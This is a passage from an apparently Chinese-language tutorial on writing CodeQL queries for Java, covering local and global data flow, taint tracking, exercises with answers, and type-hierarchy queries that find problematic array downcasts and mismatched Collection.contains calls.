class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import java  </span><br><span class="line">import semmle.code.java.dataflow.DataFlow  </span><br><span class="line">import semmle.code.java.StringFormat  </span><br><span class="line">  </span><br><span class="line">from StringFormatMethod format, MethodAccess call, Expr formatString  </span><br><span class="line">where  </span><br><span class="line">call.getMethod() = format and  </span><br><span class="line">call.getArgument(format.getFormatStringIndex()) = formatString and  </span><br><span class="line">not exists(DataFlow::Node source, DataFlow::Node sink |  </span><br><span class="line">DataFlow::localFlow(source, sink) and  </span><br><span class="line">source.asExpr() instanceof StringLiteral and  </span><br><span class="line">sink.asExpr() = formatString  </span><br><span class="line">)  </span><br><span class="line">select call, &quot;Argument to String format method isn&#x27;t hard-coded.&quot;</span><br></pre></td></tr></table></figure><p><a class="link" href="https://codeql.github.com/docs/ql-language-reference/formulas/#exists">exists<i class="fas fa-external-link-alt"></i></a>：<code>exists(&lt;variable declarations&gt; | &lt;formula&gt;)</code>。还可以写作<code>exists(&lt;variable declarations&gt; | &lt;formula 1&gt; | &lt;formula 2&gt;)</code>，相当于 <code>exists(&lt;variable declarations&gt; | &lt;formula 1&gt; and &lt;formula 2&gt;)</code>。这个函数引入了一些新的变量，如果变量至少有一组值可以使主体中的公式为真，则该函数成立。例如， <code>exists(int i | i instanceof OneTwoThree)</code> 引入<code>int</code>类型的临时变量<code>i</code>，如果<code>i</code>的任何值是<code>OneTwoThree</code>类型，则函数成立</p><p><a class="link" href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Expr.qll/type.Expr$StringLiteral.html">StringLiteral<i class="fas fa-external-link-alt"></i></a>：<code>Class StringLiteral</code>，字符串文本或文本块（Java 15特性）</p><h4 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h4><p>对应的<a href>练习答案</a></p><p>练习1：使用局部数据流编写一个查询，查找所有用于创建 <code>java.net.URL</code> 的硬编码字符串</p><h3 id="全局数据流"><a href="#全局数据流" class="headerlink" title="全局数据流"></a>全局数据流</h3><p>全局数据流跟踪整个程序中的数据流，因此比局部数据流更强大。然而，全局数据流不如局部数据流精确，分析通常需要大量时间和内存。</p><h4 id="使用全局数据流"><a href="#使用全局数据流" class="headerlink" title="使用全局数据流"></a>使用全局数据流</h4><p>可以通过扩展类 <code>DataFlow::Configuration</code>来使用全局数据流库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line">class MyDataFlowConfiguration extends DataFlow::Configuration &#123;</span><br><span class="line">  MyDataFlowConfiguration() &#123; this = &quot;MyDataFlowConfiguration&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这些谓词在配置中定义：</p><ul><li><code>isSource</code>： 定义了数据可能从何而来</li><li><code>isSink</code>：定义了数据可能流向的位置</li><li><code>isBarrier</code>：可选，限制数据流</li><li><code>isAdditionalFlowStep</code>：可选，添加额外的流程步骤</li></ul><p>特征谓词 <code>MyDataFlowConfiguration()</code> 定义了配置的名称，所以<code>&quot;MyDataFlowConfiguration&quot;</code>应该是唯一的名称，例如你的类名</p><p>使用谓词 <code>hasFlow(DataFlow::Node source, DataFlow::Node sink)</code>执行数据流分析：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from MyDataFlowConfiguration dataflow, DataFlow::Node source, DataFlow::Node sink  </span><br><span class="line">where dataflow.hasFlow(source, sink)  </span><br><span class="line">select source, &quot;Data flow to $@.&quot;, sink, sink.toString()</span><br></pre></td></tr></table></figure><h4 id="使用全局污点跟踪"><a href="#使用全局污点跟踪" class="headerlink" title="使用全局污点跟踪"></a>使用全局污点跟踪</h4><p>就像局部污点跟踪是对局部数据流的跟踪一样，全局污点跟踪是对全局数据流的跟踪。也就是说，全局污点跟踪通过额外的非保值步骤扩展了全局数据流。</p><p><a class="link" href="https://github.com/github/codeql/discussions/8460">Difference between DataFlow::Configuration and TaintTracking::Configuration<i class="fas fa-external-link-alt"></i></a></p><p>可以通过扩展类 <code>TaintTracking::Configuration</code>来使用全局污点跟踪库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import semmle.code.java.dataflow.TaintTracking  </span><br><span class="line">  </span><br><span class="line">class MyTaintTrackingConfiguration extends TaintTracking::Configuration &#123;  </span><br><span class="line">  MyTaintTrackingConfiguration() &#123; this = &quot;MyTaintTrackingConfiguration&quot; &#125;  </span><br><span class="line">  </span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;  </span><br><span class="line">    ...  </span><br><span class="line">  &#125;  </span><br><span class="line">  </span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;  </span><br><span class="line">    ...  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这些谓词在配置中定义：</p><ul><li><code>isSource</code>：定义了污点可能来自哪里</li><li><code>isSink</code>：定义了污点可能流向哪里</li><li><code>isSanitizer</code>：可选，限制污点的流动</li><li><code>isAdditionalTaintStep</code>：可选，添加其他污点步骤</li></ul><p>与全局数据流类似，特征谓词 <code>MyTaintTrackingConfiguration()</code> 定义了配置的唯一名称</p><p>污点跟踪分析使用谓词 <code>hasFlow(DataFlow::Node source, DataFlow::Node sink)</code></p><h4 id="Flow-sources"><a href="#Flow-sources" class="headerlink" title="Flow sources"></a>Flow sources</h4><p>数据流库包含一些预定义的流源。 <code>RemoteFlowSource</code> 类（在<code>semmle.code.java.dataflow.FlowSources</code>）中定义）表示可能由远程用户控制的数据流源，这对于查找安全问题很有用</p><h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><p>此查询显示使用远程用户输入作为数据源的污点跟踪配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import java  </span><br><span class="line">import semmle.code.java.dataflow.FlowSources  </span><br><span class="line">  </span><br><span class="line">class MyTaintTrackingConfiguration extends TaintTracking::Configuration &#123;  </span><br><span class="line">  MyTaintTrackingConfiguration() &#123;  </span><br><span class="line">    this = &quot;...&quot;  </span><br><span class="line">  &#125;  </span><br><span class="line">  </span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;  </span><br><span class="line">    source instanceof RemoteFlowSource  </span><br><span class="line">  &#125;  </span><br><span class="line">  </span><br><span class="line">  ...  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="练习-1"><a href="#练习-1" class="headerlink" title="练习"></a>练习</h4><p>练习2：编写一个查询，使用全局数据流查找用于创建 <code>java.net.URL</code>的所有硬编码字符串</p><p>练习3：编写一个表示来自 <code>java.lang.System.getenv(..)</code>的流源的类</p><p>练习4：使用2和3中的答案，编写一个查询，查找所有从 <code>getenv</code> 到<code>java.net.URL</code>的全局数据流</p><h3 id="练习答案"><a href="#练习答案" class="headerlink" title="练习答案"></a>练习答案</h3><h4 id="练习一"><a href="#练习一" class="headerlink" title="练习一"></a>练习一</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import semmle.code.java.dataflow.DataFlow  </span><br><span class="line">  </span><br><span class="line">from Constructor url, Call call, StringLiteral src  </span><br><span class="line">where  </span><br><span class="line">  url.getDeclaringType().hasQualifiedName(&quot;java.net&quot;, &quot;URL&quot;) and  </span><br><span class="line">  call.getCallee() = url and  </span><br><span class="line">  DataFlow::localFlow(DataFlow::exprNode(src), DataFlow::exprNode(call.getArgument(0)))  </span><br><span class="line">select src</span><br></pre></td></tr></table></figure><h4 id="练习二"><a href="#练习二" class="headerlink" title="练习二"></a>练习二</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import semmle.code.java.dataflow.DataFlow  </span><br><span class="line">  </span><br><span class="line">class Configuration extends DataFlow::Configuration &#123;  </span><br><span class="line">  Configuration() &#123;  </span><br><span class="line">    this = &quot;LiteralToURL Configuration&quot;  </span><br><span class="line">  &#125;  </span><br><span class="line">  </span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;  </span><br><span class="line">    source.asExpr() instanceof StringLiteral  </span><br><span class="line">  &#125;  </span><br><span class="line">  </span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;  </span><br><span class="line">    exists(Call call |  </span><br><span class="line">      sink.asExpr() = call.getArgument(0) and  </span><br><span class="line">      call.getCallee().(Constructor).getDeclaringType().hasQualifiedName(&quot;java.net&quot;, &quot;URL&quot;)  </span><br><span class="line">    )  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">from DataFlow::Node src, DataFlow::Node sink, Configuration config  </span><br><span class="line">where config.hasFlow(src, sink)  </span><br><span class="line">select src, &quot;This string constructs a URL $@.&quot;, sink, &quot;here&quot;</span><br></pre></td></tr></table></figure><h4 id="练习三"><a href="#练习三" class="headerlink" title="练习三"></a>练习三</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import java  </span><br><span class="line">  </span><br><span class="line">class GetenvSource extends MethodAccess &#123;  </span><br><span class="line">  GetenvSource() &#123;  </span><br><span class="line">    exists(Method m | m = this.getMethod() |  </span><br><span class="line">      m.hasName(&quot;getenv&quot;) and  </span><br><span class="line">      m.getDeclaringType() instanceof TypeSystem  </span><br><span class="line">    )  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="练习四"><a href="#练习四" class="headerlink" title="练习四"></a>练习四</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import semmle.code.java.dataflow.DataFlow  </span><br><span class="line">  </span><br><span class="line">class GetenvSource extends DataFlow::ExprNode &#123;  </span><br><span class="line">  GetenvSource() &#123;  </span><br><span class="line">    exists(Method m | m = this.asExpr().(MethodAccess).getMethod() |  </span><br><span class="line">      m.hasName(&quot;getenv&quot;) and  </span><br><span class="line">      m.getDeclaringType() instanceof TypeSystem  </span><br><span class="line">    )  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">class GetenvToURLConfiguration extends DataFlow::Configuration &#123;  </span><br><span class="line">  GetenvToURLConfiguration() &#123;  </span><br><span class="line">    this = &quot;GetenvToURLConfiguration&quot;  </span><br><span class="line">  &#125;  </span><br><span class="line">  </span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;  </span><br><span class="line">    source instanceof GetenvSource  </span><br><span class="line">  &#125;  </span><br><span class="line">  </span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;  </span><br><span class="line">    exists(Call call |  </span><br><span class="line">      sink.asExpr() = call.getArgument(0) and  </span><br><span class="line">      call.getCallee().(Constructor).getDeclaringType().hasQualifiedName(&quot;java.net&quot;, &quot;URL&quot;)  </span><br><span class="line">    )  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">from DataFlow::Node src, DataFlow::Node sink, GetenvToURLConfiguration config  </span><br><span class="line">where config.hasFlow(src, sink)  </span><br><span class="line">select src, &quot;This environment variable constructs a URL $@.&quot;, sink, &quot;here&quot;</span><br></pre></td></tr></table></figure><h3 id="Java-中的类型"><a href="#Java-中的类型" class="headerlink" title="Java 中的类型"></a>Java 中的类型</h3><p>标准 CodeQL 库通过 <code>Type</code> 类及其各种子类来表示 Java 类型</p><p><code>PrimitiveType</code>类表示Java语言中内置的基本类型（如<code>boolean</code>和<code>int</code>），而<code>RefType</code>及其子类表示引用类型，即类、接口、数组类型等。也包括来自Java标准库的类型（如<code>Java.lang.Object</code>）和由非库代码定义的类型</p><p><code>RefType</code> 类还为类层次结构建模：成员谓词 <code>getASupertype</code> 和 <code>getASubtype</code> 可以查找引用类型的直接超类和子类。例如，对于以下 Java 程序：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">I</span> &#123;&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">extends</span> <span class="title class_">A</span> <span class="keyword">implements</span> <span class="title class_">I</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>类<code>A</code>有一个直接超类（<code>java.lang.Object</code>）和一个直接子类（<code>B</code>）；接口<code>I</code>也是如此。而类<code>B</code>有两个直接超类（<code>A</code>和<code>I</code>），没有直接子类</p><p>为了确定超类（包括直接超类，以及它们的超类等），我们可以使用传递闭包。例如，要在上面的示例中查找<code>B</code>的所有超类，我们可以使用以下查询：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java  </span><br><span class="line">  </span><br><span class="line">from Class B  </span><br><span class="line">where B.hasName(&quot;B&quot;)  </span><br><span class="line">select B.getASupertype+()</span><br></pre></td></tr></table></figure><p>如果在上面的示例代码段上运行此查询，则查询将返回<code>A</code>、<code>I</code>和<code>java.lang.Object</code></p><p>除了类层次结构建模，<code>RefType</code>还提供成员谓词<code>getAMember</code>，用于访问类中声明的成员（即字段、构造函数和方法），以及谓词<code>inherits(Method m)</code>，用于检查类是否声明或继承方法<code>m</code></p><h4 id="示例：查找有问题的数组强制转换"><a href="#示例：查找有问题的数组强制转换" class="headerlink" title="示例：查找有问题的数组强制转换"></a>示例：查找有问题的数组强制转换</h4><p>作为如何使用类层次结构API的示例，我们可以编写一个查询来查找数组的向下转型，也就是某种类型<code>A[]</code>转换为类型<code>B[]</code>的表达式<code>e</code>（<code>B</code>是<code>A</code>的（不一定是直接的）子类）</p><p>这种类型的转换是有问题的，因为向下转换数组会导致运行时异常，即使每个数组元素都可以向下转换。例如，以下代码会引发<code>ClassCastException</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Object[] o = <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;Hello&quot;</span>, <span class="string">&quot;world&quot;</span> &#125;;  </span><br><span class="line">String[] s = (String[])o;</span><br></pre></td></tr></table></figure><p>另一方面，如果表达式<code>e</code>恰好计算为<code>B[]</code>数组，则转换将成功：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Object[] o = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;Hello&quot;</span>, <span class="string">&quot;world&quot;</span> &#125;;</span><br><span class="line">String[] s = (String[])o;</span><br></pre></td></tr></table></figure><p>在本文中，我们不尝试区分这两种情况。 我们的查询应该只是简单地查找从 <code>source</code> 类转换为 <code>target</code> 类的转换表达式 <code>ce</code>：</p><ul><li><code>source</code> 和 <code>target</code> 都是数组类型</li><li><code>source</code> 的元素类型是 <code>target</code> 元素类型的可传递超类</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import java  </span><br><span class="line">  </span><br><span class="line">from CastExpr ce, Array source, Array target  </span><br><span class="line">where source = ce.getExpr().getType() and  </span><br><span class="line">    target = ce.getType() and  </span><br><span class="line">    target.getElementType().(RefType).getASupertype+() = source.getElementType()  </span><br><span class="line">select ce, &quot;Potentially problematic array downcast.&quot;</span><br></pre></td></tr></table></figure><p>请注意，通过将 <code>target.getElementType()</code> 转换为<code>RefType</code>，我们排除了所有元素类型为原始类型的情况，即 <code>target</code>是原始类型的数组：在这种情况下不会出现我们正在寻找的问题。 与 Java 不同，QL 中的强制转换永远不会失败：如果无法将表达式强制转换为所需的类型，它会简单地从查询结果中排除，这也正是我们想要的</p><h5 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h5><p>在版本5之前的旧Java代码上运行此查询，通常会返回由于使用将集合转换为<code>T[]</code>类型的数组的方法<code>Collection.toArray(T[])</code>而产生的许多误报结果</p><p>在不使用泛型的代码中，这个方法通常如下使用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">List</span> <span class="variable">l</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();  </span><br><span class="line"><span class="comment">// add some elements of type A to l  </span></span><br><span class="line">A[] as = (A[])l.toArray(<span class="keyword">new</span> <span class="title class_">A</span>[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><p>这段代码中，<code>l</code>是原始类型<code>List</code>，所以<code>l.toArray</code>返回<code>Object[]</code>类型，与它的参数数组的类型无关。因此从<code>Object[]</code>转到<code>A[]</code>会被我们的查询标记为有问题，尽管在运行时，这个转换永远不会出错</p><p>为了识别这些情况，我们可以创建两个 CodeQL 类分别用来表示 <code>Collection.toArray</code> 方法和此方法或任何重写它的方法的调用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/** class representing java.util.Collection.toArray(T[]) */  </span><br><span class="line">class CollectionToArray extends Method &#123;  </span><br><span class="line">    CollectionToArray() &#123;  </span><br><span class="line">        this.getDeclaringType().hasQualifiedName(&quot;java.util&quot;, &quot;Collection&quot;) and  </span><br><span class="line">        this.hasName(&quot;toArray&quot;) and  </span><br><span class="line">        this.getNumberOfParameters() = 1  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">/** class representing calls to java.util.Collection.toArray(T[]) */  </span><br><span class="line">class CollectionToArrayCall extends MethodAccess &#123;  </span><br><span class="line">    CollectionToArrayCall() &#123;  </span><br><span class="line">        exists(CollectionToArray m |  </span><br><span class="line">            this.getMethod().getSourceDeclaration().overridesOrInstantiates*(m)  </span><br><span class="line">        )  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    /** the call&#x27;s actual return type, as determined from its argument */  </span><br><span class="line">    Array getActualReturnType() &#123;  </span><br><span class="line">        result = this.getArgument(0).getType()  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意在<code>CollectionToArrayCall</code>的构造函数中使用了<code>getSourceDeclaration</code>和<code>overridesOrInstantiates</code>：我们希望找到对<code>Collection.toArray</code>方法和任何重写它的方法的调用，以及这些方法的任何参数化实例。例如，在上面的示例中，<code>l.toArray</code>解析为原始类型<code>ArrayList</code>中的<code>toArray</code>方法。其源声明是位于泛型类<code>ArrayList&lt;T&gt;</code>中的<code>toArray</code>，该类重写<code>AbstractCollection&lt;T&gt;.toArray</code>，这反过来会覆盖<code>Collection&lt;T&gt;.toArray</code>，它是<code>Collection.toArray</code>的一个实例化。（因为重写方法中的类型参数<code>T</code>属于<code>ArrayList</code>，并且是属于<code>Collection</code>的类型参数的实例）</p><p>使用这些新类，我们可以扩展查询，排除误报：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import java  </span><br><span class="line">  </span><br><span class="line">// Insert the class definitions from above  </span><br><span class="line">  </span><br><span class="line">from CastExpr ce, Array source, Array target  </span><br><span class="line">where source = ce.getExpr().getType() and  </span><br><span class="line">    target = ce.getType() and  </span><br><span class="line">    target.getElementType().(RefType).getASupertype+() = source.getElementType() and  </span><br><span class="line">    not ce.getExpr().(CollectionToArrayCall).getActualReturnType() = target  </span><br><span class="line">select ce, &quot;Potentially problematic array downcast.&quot;</span><br></pre></td></tr></table></figure><h4 id="示例：查找不匹配的contains"><a href="#示例：查找不匹配的contains" class="headerlink" title="示例：查找不匹配的contains"></a>示例：查找不匹配的contains</h4><p>我们现在将编写一个查询来查找查询元素的类型与集合的元素类型无关的 <code>Collection.contains</code> 的使用</p><p>例如，<a class="link" href="https://zookeeper.apache.org/">Apache Zookeeper<i class="fas fa-external-link-alt"></i></a>以前在类<code>QuorumPeerConfig</code>中有一段类似于以下内容的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;Object, Object&gt; zkProp;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// ...  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (zkProp.entrySet().contains(<span class="string">&quot;dynamicConfigFile&quot;</span>))&#123;  </span><br><span class="line">    <span class="comment">// ...  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于<code>zkProp</code>是从<code>Object</code>到<code>Object</code>的映射，因此<code>zkProp.entrySet</code>返回一个<code>Set&lt;Entry&lt;Object, Object&gt;&gt;</code>类型的集合。 这样的集合不可能包含<code>String</code>类型的元素（代码已被修复为使用<code>zkProp.containsKey</code>）</p><p>一般来说，我们希望找到对<code>Collection.contains</code>的调用（或任何<code>Collection</code>的参数化实例中的重写了它方法），而且集合元素的类型<code>E</code>和<code>contains</code>参数的类型<code>A</code>是不相关的，也就是说，它们没有共同的子类</p><p>首先创建一个描述<code>java.util.Collection</code>的类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">JavaUtilCollection</span> <span class="keyword">extends</span> <span class="title class_">GenericInterface</span> &#123;  </span><br><span class="line">    JavaUtilCollection() &#123;  </span><br><span class="line">        <span class="built_in">this</span>.hasQualifiedName(<span class="string">&quot;java.util&quot;</span>, <span class="string">&quot;Collection&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了确保没有错误，可以运行一个简单的测试查询：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from JavaUtilCollection juc  </span><br><span class="line">select juc</span><br></pre></td></tr></table></figure><p>这个查询应该只返回一个结果</p><p>然后创建一个描述<code>java.util.Collection.contains</code>的类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class JavaUtilCollectionContains extends Method &#123;  </span><br><span class="line">    JavaUtilCollectionContains() &#123;  </span><br><span class="line">        this.getDeclaringType() instanceof JavaUtilCollection and  </span><br><span class="line">        this.hasStringSignature(&quot;contains(Object)&quot;)  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里使用了<code>hasStringSignature</code>来检查以下项：</p><ul><li>该方法的名称为<code>contains</code></li><li>它只有一个参数</li><li>参数的类型是<code>Object</code></li></ul><p>或者可以使用 <code>hasName</code>，<code>getNumberOfParameters</code>，<code>getParameter(0).getType() instanceof TypeObject</code> 来分别实现这三项</p><p>现在我们要识别对<code>Collection.contains</code>的所有调用，包括任何重写它的方法，并考虑<code>Collection</code>的所有参数化实例以及其子类，编写如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class JavaUtilCollectionContainsCall extends MethodAccess &#123;</span><br><span class="line">    JavaUtilCollectionContainsCall() &#123;</span><br><span class="line">        exists(JavaUtilCollectionContains jucc |</span><br><span class="line">            this.getMethod().getSourceDeclaration().overrides*(jucc)</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于每次调用<code>contains</code>，我们关注的是参数的类型以及调用它的集合的元素类型。 所以我们需要在类<code>JavaUtilCollectionContainsCall</code>中添加<code>getArgumentType</code>和<code>getCollectionElementType</code>这两个成员谓词</p><p>前者很简单：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Type getArgumentType() &#123;  </span><br><span class="line">    result = this.getArgument(0).getType()  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于后者，我们将按以下步骤进行：</p><ul><li>找到被调用的<code>contains</code>方法的声明类型<code>D</code></li><li>找到<code>D</code>的超类<code>S</code>（或者<code>D</code>本身），且是<code>java.util.Collection</code>的参数化实例</li><li>返回<code>S</code>的类型参数</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Type getCollectionElementType() &#123;  </span><br><span class="line">    exists(RefType D, ParameterizedInterface S |  </span><br><span class="line">        D = this.getMethod().getDeclaringType() and  </span><br><span class="line">        D.hasSupertype*(S) and S.getSourceDeclaration() instanceof JavaUtilCollection and  </span><br><span class="line">        result = S.getTypeArgument(0)  </span><br><span class="line">    )  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将这两个成员谓词添加到<code>JavaUtilCollectionContainsCall</code>中，我们还需要编写一个谓词来检查两个给定的引用类型是否具有公共子类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 